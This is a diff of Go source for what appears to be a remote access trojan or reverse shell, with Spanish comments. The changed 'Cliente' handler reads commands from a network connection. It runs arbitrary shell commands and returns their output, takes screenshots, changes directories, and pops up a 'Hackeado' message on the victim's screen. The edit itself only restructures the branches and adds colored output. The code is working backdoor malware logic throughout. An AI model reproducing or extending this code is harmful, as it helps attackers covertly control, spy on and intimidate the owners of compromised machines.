@@ -196,73 +196,76 @@ func Cliente(cliente net.Conn) {
 	if match_cd { // logica de cd
 		Cd(entrada, cliente)
 
-	} else if match_msn {
+	} else if match_msn { //logica de mensajes
 		msg := strings.Split(entrada, "-")
 
 		msgerr := sistema.MsgCartel("Hackeado", msg[1])
 
 		if msgerr == nil {
-			Envio(cliente, []byte("- el usuario vió el mensaje"))
+			Envio(cliente, []byte(VERDE+"\n- el usuario vió el mensaje\n"+RESET))
 		}
 
-	} else if entrada == "ss" { // logica de ss
-		ch_err := make(chan error)
-		contx, cancelar := context.WithTimeout(context.Background(), time.Second*10)
-		defer cancelar()
-		go func() {
+	} else {
+		switch entrada {
+		case "ss": // logica de ss
+			ch_err := make(chan error)
+			contx, cancelar := context.WithTimeout(context.Background(), time.Second*10)
+			defer cancelar()
+			go func() {
 
-			ch_err <- Ss(cliente)
+				ch_err <- Ss(cliente)
 
-		}()
-		select {
-		case <-contx.Done():
-			Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
-		case erro := <-ch_err:
-			if erro != nil {
-				fmt.Println("[!] hubo un error durante el screenshot : ", erro)
+			}()
+			select {
+			case <-contx.Done():
+				Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
+			case erro := <-ch_err:
+				if erro != nil {
+					fmt.Println("[!] hubo un error durante el screenshot : ", erro)
+				}
 			}
+
+		case "q": //salir del programa
+			fmt.Println("[!] cliente desconectado")
+			return
+
+		default: // ejecucion de cualquier otro comando
+
+			var ch_error = make(chan error)   // gestiona errores
+			var ch_salida = make(chan []byte) // gestiona salidas de comando
+
+			contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)
+
+			defer cancelar()
+
+			go func() {
+				salida, err := Ejecucion(entrada)
+
+				if err != nil {
+					ch_error <- err
+				} else {
+					ch_salida <- salida
+				}
+
+			}()
+
+			select {
+			case <-contexto.Done():
+				Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))
+
+			case salida := <-ch_salida:
+
+				err := Envio(cliente, salida)
+
+				if err != nil {
+					fmt.Println("[!] hubo un problema al enviar")
+				}
+
+			case err := <-ch_error:
+
+				fmt.Println("[!] hubo un problema: ", err)
+			}
+
 		}
-
-	} else if entrada == "q" {
-		fmt.Println("[!] cliente desconectado")
-		return
-
-	} else { // ejecucion de cualquier otro comando
-
-		var ch_error = make(chan error)   // gestiona errores
-		var ch_salida = make(chan []byte) // gestiona salidas de comando
-
-		contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)
-
-		defer cancelar()
-
-		go func() {
-			salida, err := Ejecucion(entrada)
-
-			if err != nil {
-				ch_error <- err
-			} else {
-				ch_salida <- salida
-			}
-
-		}()
-
-		select {
-		case <-contexto.Done():
-			Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))
-
-		case salida := <-ch_salida:
-
-			err := Envio(cliente, salida)
-
-			if err != nil {
-				fmt.Println("[!] hubo un problema al enviar")
-			}
-
-		case err := <-ch_error:
-
-			fmt.Println("[!] hubo un problema: ", err)
-		}
-
 	}
 }
